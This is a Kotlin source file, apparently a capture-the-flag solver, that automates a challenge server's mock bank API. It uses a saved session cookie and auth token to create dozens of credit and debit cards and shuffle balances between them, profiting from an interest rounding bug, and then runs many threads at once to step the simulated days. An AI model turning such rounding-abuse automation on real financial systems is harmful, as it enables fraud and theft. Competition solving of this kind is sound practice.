package org.hydev.experiment

import kotlinx.serialization.ImplicitReflectionSerializer
import kotlinx.serialization.Serializable
import kotlinx.serialization.UnstableDefault
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonConfiguration
import org.apache.http.client.methods.HttpGet
import org.apache.http.client.methods.HttpPost
import org.apache.http.client.protocol.HttpClientContext
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.BasicCookieStore
import org.apache.http.impl.client.HttpClients
import org.apache.http.impl.cookie.BasicClientCookie
import org.apache.http.util.EntityUtils
import org.hydev.logger.HyLoggerConfig
import org.hydev.logger.appenders.FileAppender
import java.io.File
import kotlin.math.roundToInt
import kotlin.system.exitProcess

/**
 * TODO: Write a description for this class!
 *
 * @author HyDEV Team (https://github.com/HyDevelop)
 * @author Hykilpikonna (https://github.com/hykilpikonna)
 * @author Vanilla (https://github.com/VergeDX)
 * @since 2020-11-02 15:51
 */
@OptIn(UnstableDefault::class)
@ImplicitReflectionSerializer
fun main(args: Array<String>)
{
    // Json
    val json = Json(JsonConfiguration(isLenient = true))

    // HyLogger
    HyLoggerConfig.appenders.add(FileAppender("./logs", "ctf-doggy.log"))
    HyLoggerConfig.installSysOut()

    // Create http client
    val builder = HttpClients.custom()
    val context = HttpClientContext.create()
    val cookies = BasicCookieStore()
    context.cookieStore = cookies
    builder.setDefaultCookieStore(cookies)
    val client = builder.build()

    // CTF session
    val sessionFile = File("doggy-session.txt")
    cookies.addCookie(BasicClientCookie("session", sessionFile.readText().replace("\n", ""))
        .apply { domain = "202.38.93.111" })
    val auth = File("doggy-auth.txt").readText()

    val host = "http://202.38.93.111:10102/api/"

    // Function to access api
    fun get(api: String, body: String): String
    {
        val get = if (body == "") HttpGet(host + api)
        else HttpPost(host + api).apply { entity = StringEntity(body) }

        get.addHeader("authorization", auth)
        get.addHeader("accept", "application/json, text/plain, */*")
        get.addHeader("content-type", "application/json;charset=UTF-8")
        val response = client.execute(get)

        if (response.statusLine.statusCode != 200)
        {
            println("Error $api - Body: $body ; Status code: ${response.statusLine.statusCode}")
        }

        val responseBody = EntityUtils.toString(response.entity, "UTF-8")
        response.close()
        return responseBody
    }

    fun getUser() = json.parse(User.serializer(), get("user", ""))
    fun transfer(src: Int, dst: Int, amount: Int)
    {
        get("transfer", "{\"src\":$src,\"dst\":$dst,\"amount\":$amount}")
        println("→ Transfer from $src to $dst, $amount")
    }

    fun create(credit: Boolean)
    {
        get("create", "{\"type\":\"${if (credit) "credit" else "debit"}\"}")
        println("+ Created ${if (credit) "credit" else "debit"} card.")
    }

    fun eat(card: Int, log: Boolean = true)
    {
        get("eat", "{\"account\":$card}")
        if (log) println("================ DAY ENDS ================")
    }

    // Each problem
    while (true)
    {
        // Backup session
        val session = cookies.cookies.filter { it.name == "session" }[0].value
        println("==============SESSION===============")
        println(session)
        println("================END=================")
        sessionFile.writeText(session)

        // Get today
        val user = getUser()

        // 后期可以不用四舍五入 bug 赚钱了
        if (user.printSummary())
        {
            // 把所有储蓄卡转到卡 1
            user.debits().forEach {
                if (it.balance != 0) transfer(it.id, 1, it.balance)
            }

            // 把所有债还了
            user.credits().forEach {
                if (it.balance != 0) transfer(1, it.id, it.balance)
            }

            break
        }

        // 初始化: 每 1 张信用卡添加 12 张储蓄卡
        if (user.date == 1 && user.credits().isEmpty())
        {
            var idStart = 2 // 这一组的信用卡 ID
            for (credit in 0..19)
            {
                create(true)

                for (debit in 1..12)
                {
                    create(false)

                    // 从信用卡给储蓄卡付款 167
                    transfer(idStart, idStart + debit, 167)
                }
                idStart += 13
            }
        }

        val debitThreshold = 10 + user.date / 10
        val creditThreshold = 100

        // 检查每张储蓄卡都差不多 167, 多赚的转到卡 1
        user.debits().forEach {
            if (it.balance > 167 + debitThreshold && it.id != 1)
            {
                Thread { transfer(it.id, 1, it.balance - 167) }.start()
                Thread.sleep(100)
            }
        }

        // 让信用卡都小于 -2098，多欠的的用卡 1 付
        user.credits().forEach {
            val transfer = it.balance - 2098 + creditThreshold
            if (it.balance > 2098 && user.swap().balance > transfer) transfer(1, it.id, transfer)
        }

        // 吃!
        eat(1)
    }

    // 后期模式, 开 15 个线程一起吃w
    for (i in 0..14)
    {
        Thread { while (true) eat(1, false) }.start()
    }
    println("Rounding mode ended.")

    while (true)
    {
        when (readLine()!!.toLowerCase())
        {
            "stop" -> exitProcess(0)
            "summary" -> getUser().printSummary()
        }
    }
}

@Serializable
data class Account(
    val balance: Int,
    val id: Int,
    val type: String
)

@Serializable
data class User(
    val accounts: List<Account>,
    val date: Int,
    val flag: String?
)
{
    fun credits() = accounts.filter { it.type == "credit" }
    fun debits() = accounts.filter { it.type == "debit" }
    fun swap() = debits().find { it.id == 1 }!!

    /**
     * Print summary and check if it's ready to leave the rounding profit system.
     */
    fun printSummary(): Boolean
    {
        val dSum = debits().map { it.balance }.sum()
        val cSum = credits().map { it.balance }.sum()
        val dd = debits().map { (it.balance * 0.003).roundToInt() }.sum()
        val dc = -credits().map { (it.balance * 0.005).roundToInt() }.sum()
        val de = -10
        val sum = dd + dc + de
        println("Summary - Total Balance: ${dSum - cSum} - DD: +$dd, DC: $dc, DE: $de, Sum: $sum")

        // Check if it's ready to leave the rounding profit system
        return ((dSum - cSum) * 0.003).roundToInt() > 20
    }
}
